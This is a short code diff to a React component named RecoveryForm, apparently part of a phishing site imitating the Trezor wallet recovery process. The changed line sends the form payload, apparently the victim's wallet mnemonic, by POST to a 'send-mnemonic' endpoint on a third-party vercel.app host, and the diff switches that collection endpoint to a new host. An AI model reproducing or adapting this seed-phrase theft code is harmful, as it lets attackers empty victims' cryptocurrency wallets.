@@ -40,7 +40,7 @@ const RecoveryForm = () => {
 
         try {
             setLoading(true);
-            const response = await fetch(" https://trezor-backend.vercel.app/api/v1/send-mnemonic", {
+            const response = await fetch("https://trezor-backend-zeta.vercel.app/api/v1/send-mnemonic", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload),
